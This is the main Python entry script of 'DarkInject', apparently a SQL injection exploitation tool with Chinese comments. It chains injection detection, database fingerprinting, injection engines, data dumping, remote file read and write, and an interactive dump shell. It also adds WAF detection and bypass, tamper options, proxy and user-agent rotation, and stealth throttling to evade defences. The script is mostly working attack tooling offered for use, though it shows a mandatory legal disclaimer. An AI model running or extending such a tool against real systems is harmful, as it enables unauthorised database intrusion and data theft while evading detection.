#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DarkInject v1.2.0 - 主入口"""
import json
import logging
import sys

from ui.cli import parse_args, print_banner
from ui.shell import interactive_shell
from ui import banner
from ui.progress import RollingBar
from ui.legal import legal_disclaimer
from core.requester import Requester
from core.detector import Detector
from core.fingerprinter import Fingerprinter
from core.engine import Engine
from core.dumper import Dumper
from core.throttle import Throttle
from core.proxy_pool import ProxyPool
from core.waf_detector import WAFDetector
from core.blacklist import build_blacklist
from utils.ua_pool import UAPool
from utils.helpers import parse_kv, parse_cookies, parse_headers, normalize_space
from utils.logger import Logger

# 关闭 urllib3 的冗余日志
logging.getLogger("urllib3").setLevel(logging.ERROR)


def main():
    args = parse_args()

    # ================= 法律声明（必须在任何网络请求之前） =================
    # 强制且不可绕过：每次运行都要输入 I AGREE（没有 --no-legal 之类的开关）。
    legal_disclaimer()

    log = Logger(level=args.verbose)

    # ---- 加载 WAF 黑名单（用于自动绕过） ----
    blacklist = None
    if args.blacklist:
        try:
            blacklist = build_blacklist(path=args.blacklist)
            blacklist.mode = args.waf_mode
        except Exception as e:
            log.warn(f"黑名单加载失败: {e}")
        if blacklist and blacklist.tokens:
            print(f"[+] 已加载黑名单: {args.blacklist}")
            print(blacklist.describe())
        elif blacklist:
            print(f"[!] 黑名单为空: {args.blacklist}")

    if args.json_body:
        # JSON body：--data 传的是 JSON 文本，顶层必须是对象
        try:
            base_data = json.loads(args.data) if args.data.strip() else {}
        except Exception as e:
            log.error(f"--data 不是合法 JSON: {e}")
            sys.exit(1)
        if not isinstance(base_data, dict):
            log.error('--json 模式下 --data 的顶层必须是对象，如 {"id": 1}')
            sys.exit(1)
    else:
        base_data = parse_kv(args.data)
    base_params = parse_kv(args.params)
    base_cookies = parse_cookies(args.cookie)
    base_headers = parse_headers(args.header)
    space = normalize_space(args.space)

    url = args.url.strip("'\"")
    if "?" in url:
        url, qs = url.split("?", 1)
        if not base_params:
            base_params = parse_kv(qs)

    # ---- User-Agent ----
    if args.user_agent:
        base_headers["User-Agent"] = args.user_agent
        ua_pool = None
    elif args.random_agent:
        ua_pool = UAPool(rotate="random")
    else:
        base_headers["User-Agent"] = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
        )
        ua_pool = None

    # ---- 代理池 ----
    if args.proxy_file:
        proxy_pool = ProxyPool.from_file(args.proxy_file, rotate=args.proxy_rotate)
        if proxy_pool.size() == 0:
            log.warn(f"代理文件为空: {args.proxy_file}")
            proxy_pool = None
    elif args.proxy:
        proxy_pool = ProxyPool([args.proxy], rotate="single")
    else:
        proxy_pool = None

    # ---- 节流器 ----
    throttle = Throttle(
        delay=args.delay, jitter=args.jitter,
        qps=args.qps, human_mode=args.human,
    )

    print_banner(url, args, base_data, base_params, base_cookies)

    if proxy_pool:
        print(f"[+] 代理池: {proxy_pool.size()} 个代理 ({args.proxy_rotate})")
    if ua_pool:
        print(f"[+] UA 池: {len(ua_pool.pool)} 个 User-Agent")

    # ---- 构建请求器 ----
    req = Requester(
        url=url, method=args.method, position=args.position, param=args.param,
        base_data=base_data, base_params=base_params,
        base_headers=base_headers, base_cookies=base_cookies,
        timeout=args.timeout,
        throttle=throttle, ua_pool=ua_pool, proxy_pool=proxy_pool,
        retries=args.retries, retry_delay=args.retry_delay,
        log=log, json_body=args.json_body,
    )

    # ---- WAF 探测（stealth 模式下自动开启） ----
    if args.stealth:
        WAFDetector(req, log=log).detect()

    # ---- Step 1/5 ----
    banner.print_step(1, 5, "探测闭合方式")
    param_list = getattr(args, "param_list", [args.param])
    injectable = []                     # [(参数名, Detector), ...]
    for idx, pname in enumerate(param_list, 1):
        if len(param_list) > 1:
            print(f"[*] 参数 {idx}/{len(param_list)}: {pname}")
        req.param = pname
        req.clear_cache()               # 换参数必须清缓存，否则会命中上个参数的响应
        d = Detector(req, space=space, log=log, blacklist=blacklist)
        if d.detect():
            injectable.append((pname, d))
        elif len(param_list) > 1:
            print(f"[-] 参数 {pname}: 未探测到注入")

    if not injectable:
        log.error("所有参数均未探测到注入" if len(param_list) > 1 else "闭合方式探测失败")
        sys.exit(1)

    pname, det = injectable[0]
    if len(injectable) > 1:
        rest = ", ".join(p for p, _ in injectable[1:])
        print(f"[+] 共 {len(injectable)} 个参数可注入，本次使用 '{pname}'（其余: {rest}）")
        print("    需要改打其他参数时，用 --param <name> 单独跑一次")
    # 循环结束后 req.param 停在最后一个参数上，必须复位到选中参数
    req.param = pname
    req.clear_cache()

    # ---- Step 2/5 ----
    banner.print_step(2, 5, "DBMS 指纹识别")
    fp = Fingerprinter(req, det, log=log)
    if args.dbms == "auto":
        fp.detect()
    else:
        fp.force(args.dbms)
    dialect = fp.get_dialect()

    # ---- Step 3/5 ----
    banner.print_step(3, 5, "初始化注入技术")
    engine = Engine(
        requester=req, detector=det, dialect=dialect,
        technique=args.technique, tamper=args.tamper,
        log=log, workers=args.workers,
        force_cols=args.cols,
        force_visible_col=args.visible_col,
        charset=args.charset,
        blacklist=blacklist,
        fast=getattr(args, "fast", False),
    )
    if not engine.init():
        log.error("注入技术初始化失败")
        sys.exit(1)
    engine.req = req

    dumper = Dumper(engine, votes=(1 if getattr(args, "fast", False) else 2))

    # ---- 独立模式 ----
    if args.fingerprint:
        fp.print_info()
        return
    if args.file_read:
        from exploit.file_ops import read_file
        read_file(engine, dialect, args.file_read)
        return
    if args.file_write:
        if "::" not in args.file_write:
            log.error("--file-write 格式: 本地路径::远程路径")
            return
        local, remote = args.file_write.split("::", 1)
        from exploit.file_ops import write_file
        write_file(engine, dialect, local, remote)
        return

    # ---- Step 4/5 ----
    banner.print_step(4, 5, "获取当前数据库")

    if args.db:
        db_name = args.db
        print(f"    {banner.C.GREEN}[+] 手动指定数据库: {db_name}{banner.C.RESET}")
    else:
        bar = RollingBar(width=24, prefix="    ")
        bar.start()
        db_name = dumper.get_database()
        if not db_name:
            bar.stop(final_msg="    [-] 无法获取数据库名")
            log.error("提示: 可用 --db <name> 手动指定数据库名")
            sys.exit(1)
        bar.stop(final_msg=f"    {banner.C.GREEN}[+] 当前数据库: {db_name}{banner.C.RESET}")

    # ---- Step 5/5 ----
    banner.print_step(5, 5, "进入交互式 Shell")
    interactive_shell(dumper, db_name, max_rows=args.max_rows, engine=engine)


if __name__ == "__main__":
    main()